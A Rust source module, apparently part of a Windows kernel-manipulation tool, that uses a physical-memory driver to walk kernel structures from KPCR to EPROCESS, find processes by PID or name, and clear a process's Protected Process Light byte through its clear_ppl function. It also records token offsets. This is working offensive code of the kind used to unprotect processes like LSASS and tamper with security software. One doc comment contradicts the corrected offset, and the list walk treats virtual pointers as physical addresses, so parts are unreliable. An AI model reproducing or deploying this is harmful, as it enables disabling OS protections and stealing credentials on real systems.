//! EPROCESS locator via KPCR -> KPRCB -> KTHREAD -> EPROCESS chain.
//! All offsets confirmed on Windows 11 Build 26200 unless noted otherwise.

use std::io;

use crate::drivers::PhysicalMemoryDriver;
use super::physical::SafePhysicalReader;

// ---------------------------------------------------------------------------
// MSR addresses
// ---------------------------------------------------------------------------

/// IA32_GS_BASE — kernel GS base holds KPCR on the current processor.
pub const MSR_GS_BASE: u32 = 0xC0000101;

// ---------------------------------------------------------------------------
// KPCR offsets (Build 26200 — VERIFIED)
// ---------------------------------------------------------------------------

/// KPCR + 0x180 -> pointer to KPRCB (CurrentPrcb)
pub const KPCR_CURRENT_PRCB: u64 = 0x180;

// ---------------------------------------------------------------------------
// KPRCB offsets (Build 26200 — VERIFIED)
// ---------------------------------------------------------------------------

/// KPRCB + 0x008 -> KTHREAD* CurrentThread
pub const KPRCB_CURRENT_THREAD: u64 = 0x008;

// ---------------------------------------------------------------------------
// KTHREAD offsets (Build 26200 — NEEDS VERIFICATION)
// ---------------------------------------------------------------------------

/// KTHREAD + 0x220 -> EPROCESS* Process
/// NOTE: Some builds use +0x228. We try 0x220 first, fall back to 0x228.
pub const KTHREAD_PROCESS_PRIMARY: u64 = 0x220;
pub const KTHREAD_PROCESS_FALLBACK: u64 = 0x228;

// ---------------------------------------------------------------------------
// EPROCESS offsets (Build 26200 — CORRECTED via Vergilius Project 25H2)
// ---------------------------------------------------------------------------

/// EPROCESS + 0x028 -> DirectoryTableBase (CR3 for this process)
pub const EPROCESS_DTB: u64 = 0x028;

/// EPROCESS + 0x1D0 -> UniqueProcessId (HANDLE, 8 bytes on x64)
pub const EPROCESS_PID: u64 = 0x1D0;

/// EPROCESS + 0x338 -> ImageFileName (CHAR[15])
pub const EPROCESS_IMAGE_NAME: u64 = 0x338;

/// EPROCESS + 0x1D8 -> ActiveProcessLinks (LIST_ENTRY: Flink at +0, Blink at +8)
/// CORRECTED: was 0x540 (Windows 11 22H2/23H2 value). Build 26200 uses 0x1D8.
pub const EPROCESS_ACTIVE_LINKS: u64 = 0x1D8;

/// EPROCESS + 0x5FA -> Protection byte (PS_PROTECTION)
/// CORRECTED: was 0x87A (Windows 11 22H2/23H2 value). Build 26200 uses 0x5FA.
pub const EPROCESS_PROTECTION: u64 = 0x5FA;

/// EPROCESS + 0x248 -> Token (EX_FAST_REF)
/// CONFIRMED for Build 26200 via Vergilius Project.
pub const EPROCESS_TOKEN: u64 = 0x248;

// ---------------------------------------------------------------------------
// Implementation
// ---------------------------------------------------------------------------

/// Attempt to locate EPROCESS for the System process (PID 4) by walking the
/// KPCR -> KPRCB -> KTHREAD -> EPROCESS chain, then traversing ActiveProcessLinks.
///
/// `kpcr_phys` must be the physical address of the current processor's KPCR.
/// Typically obtained by reading MSR 0xC0000101 through the driver and resolving
/// the virtual-to-physical translation (or using identity-mapped early boot region).
pub fn find_system_eprocess(driver: &dyn PhysicalMemoryDriver, kpcr_phys: u64) -> io::Result<u64> {
    let reader = SafePhysicalReader::new(driver);

    // KPCR -> CurrentPrcb
    let prcb_ptr = reader.read_u64_safe(kpcr_phys + KPCR_CURRENT_PRCB)?;

    // KPRCB -> CurrentThread
    let thread_ptr = reader.read_u64_safe(prcb_ptr + KPRCB_CURRENT_THREAD)?;

    // KTHREAD -> Process (try primary offset, fallback if it looks invalid)
    let eprocess_ptr = read_eprocess_from_kthread(&reader, thread_ptr)?;

    // Now we have *an* EPROCESS. Walk ActiveProcessLinks to find PID 4.
    find_eprocess_by_pid_from(driver, eprocess_ptr, 4)
}

/// Walk ActiveProcessLinks starting from a known EPROCESS to find one by name.
/// `name` is matched case-insensitively against ImageFileName (max 15 chars).
pub fn find_eprocess_by_name(
    driver: &dyn PhysicalMemoryDriver,
    start_eprocess: u64,
    name: &str,
) -> io::Result<u64> {
    let reader = SafePhysicalReader::new(driver);
    let target = name.to_ascii_lowercase();

    walk_process_list(&reader, start_eprocess, |eproc_addr| {
        let image = read_image_name(&reader, eproc_addr)?;
        if image.to_ascii_lowercase() == target {
            Ok(Some(eproc_addr))
        } else {
            Ok(None)
        }
    })
}

/// Walk ActiveProcessLinks starting from a known EPROCESS to find one by PID.
pub fn find_eprocess_by_pid(
    driver: &dyn PhysicalMemoryDriver,
    start_eprocess: u64,
    pid: u64,
) -> io::Result<u64> {
    find_eprocess_by_pid_from(driver, start_eprocess, pid)
}

/// Read the DirectoryTableBase (CR3) from an EPROCESS.
pub fn read_cr3(driver: &dyn PhysicalMemoryDriver, eprocess: u64) -> io::Result<u64> {
    let reader = SafePhysicalReader::new(driver);
    reader.read_u64_safe(eprocess + EPROCESS_DTB)
}

/// Clear the PPL protection byte (write 0x00 to EPROCESS + 0x87A).
/// This disables Protected Process Light for the target process.
pub fn clear_ppl(driver: &dyn PhysicalMemoryDriver, eprocess: u64) -> io::Result<()> {
    let reader = SafePhysicalReader::new(driver);
    reader.write_safe(eprocess + EPROCESS_PROTECTION, &[0x00])
}

// ---------------------------------------------------------------------------
// Internal helpers
// ---------------------------------------------------------------------------

/// Maximum number of EPROCESS entries to traverse before giving up.
/// Prevents infinite loops on corrupted LIST_ENTRY chains.
const MAX_PROCESS_WALK: usize = 512;

/// Try reading the EPROCESS pointer from KTHREAD using primary and fallback offsets.
fn read_eprocess_from_kthread(
    reader: &SafePhysicalReader<'_>,
    kthread_phys: u64,
) -> io::Result<u64> {
    let primary = reader.read_u64_safe(kthread_phys + KTHREAD_PROCESS_PRIMARY)?;

    // Sanity check: a valid kernel pointer on x64 is in the range 0xFFFF800000000000+
    // and page-aligned (bottom 12 bits zero for EPROCESS allocation).
    if is_plausible_kernel_ptr(primary) {
        return Ok(primary);
    }

    // Try fallback offset
    let fallback = reader.read_u64_safe(kthread_phys + KTHREAD_PROCESS_FALLBACK)?;
    if is_plausible_kernel_ptr(fallback) {
        return Ok(fallback);
    }

    Err(io::Error::new(
        io::ErrorKind::NotFound,
        format!(
            "KTHREAD at 0x{:X}: neither +0x220 (0x{:X}) nor +0x228 (0x{:X}) looks like EPROCESS",
            kthread_phys, primary, fallback
        ),
    ))
}

/// Walk the doubly-linked ActiveProcessLinks list, calling `predicate` on each EPROCESS.
/// Returns the first EPROCESS address for which the predicate returns Some.
fn walk_process_list<F>(
    reader: &SafePhysicalReader<'_>,
    start_eprocess: u64,
    predicate: F,
) -> io::Result<u64>
where
    F: Fn(u64) -> io::Result<Option<u64>>,
{
    let mut current = start_eprocess;
    let mut visited = 0usize;

    loop {
        if visited >= MAX_PROCESS_WALK {
            return Err(io::Error::new(
                io::ErrorKind::Other,
                format!("process list walk exceeded {} entries", MAX_PROCESS_WALK),
            ));
        }

        if let Some(result) = predicate(current)? {
            return Ok(result);
        }

        // Follow Flink: ActiveProcessLinks.Flink points to the next LIST_ENTRY,
        // which is at EPROCESS + EPROCESS_ACTIVE_LINKS in the next process.
        let flink = reader.read_u64_safe(current + EPROCESS_ACTIVE_LINKS)?;

        // Convert LIST_ENTRY address back to EPROCESS base
        let next_eprocess = flink.wrapping_sub(EPROCESS_ACTIVE_LINKS);

        // Detect wrap-around (back to start)
        if next_eprocess == start_eprocess || next_eprocess == 0 {
            return Err(io::Error::new(
                io::ErrorKind::NotFound,
                "target process not found in ActiveProcessLinks list",
            ));
        }

        current = next_eprocess;
        visited += 1;
    }
}

/// Internal: find EPROCESS by PID starting from a given EPROCESS.
fn find_eprocess_by_pid_from(
    driver: &dyn PhysicalMemoryDriver,
    start_eprocess: u64,
    pid: u64,
) -> io::Result<u64> {
    let reader = SafePhysicalReader::new(driver);

    walk_process_list(&reader, start_eprocess, |eproc_addr| {
        let proc_pid = reader.read_u64_safe(eproc_addr + EPROCESS_PID)?;
        if proc_pid == pid {
            Ok(Some(eproc_addr))
        } else {
            Ok(None)
        }
    })
}

/// Read the ImageFileName (15-byte ASCII) from an EPROCESS, trimmed of NULs.
fn read_image_name(reader: &SafePhysicalReader<'_>, eprocess: u64) -> io::Result<String> {
    let raw = reader.read_bytes_safe(eprocess + EPROCESS_IMAGE_NAME, 15)?;
    let name = raw
        .iter()
        .take_while(|&&b| b != 0)
        .map(|&b| b as char)
        .collect::<String>();
    Ok(name)
}

/// Heuristic: is this value a plausible x64 kernel-mode pointer?
/// Kernel virtual addresses on Windows x64 are >= 0xFFFF800000000000.
/// EPROCESS is pool-allocated and page-aligned (low 12 bits typically zero,
/// but we only require it to be in kernel space).
#[inline]
fn is_plausible_kernel_ptr(val: u64) -> bool {
    val >= 0xFFFF_8000_0000_0000 && val != u64::MAX
}
